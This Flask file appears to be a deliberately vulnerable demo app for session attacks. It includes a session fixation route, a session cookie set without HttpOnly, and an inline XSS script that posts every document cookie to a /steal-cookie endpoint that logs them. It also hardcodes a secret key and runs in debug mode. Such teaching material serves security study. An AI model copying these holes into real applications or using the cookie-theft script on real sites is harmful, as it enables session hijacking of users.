from flask import Flask, session, request, redirect, url_for, make_response

app = Flask(__name__)
app.secret_key = 'your-secret-key'

@app.route('/')
def index():
    # Set a session variable
    session['user'] = 'admin'
    return "Session has been set to admin."

@app.route('/set-session/<session_id>')
def set_session(session_id):
    # Example of session fixation vulnerability: an attacker can set a session ID.
    session['user'] = 'attacker'
    session.modified = True
    response = make_response(f"Session ID set to {session_id}")
    response.set_cookie('session', session_id)  # Simulate attacker-controlled session ID
    return response

@app.route('/get-session')
def get_session():
    # Get the current session and display it
    user = session.get('user', 'Not logged in')
    return f"Current session user: {user}"

@app.route('/cookie-theft')
def cookie_theft():
    # Vulnerable to cookie theft due to no HttpOnly flag
    session['user'] = 'admin'
    response = make_response("Session cookie might be exposed to JavaScript!")
    response.set_cookie('session', 'admin_cookie', httponly=False)
    return response

@app.route('/xss-exploit')
def xss_exploit():
    # Cross-Site Scripting (XSS) vulnerability that steals session cookies
    script = """
    <script>
        document.cookie.split(';').forEach(function(c) {
            fetch('/steal-cookie', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie: c })
            });
        });
    </script>
    """
    return f"Injected XSS script: {script}"

@app.route('/steal-cookie', methods=['POST'])
def steal_cookie():
    # For demonstration purposes, we can log stolen cookies.
    cookie_data = request.json.get('cookie')
    print(f"Stolen cookie: {cookie_data}")
    return "Cookie stolen!"

if __name__ == '__main__':
    app.run(debug=True)
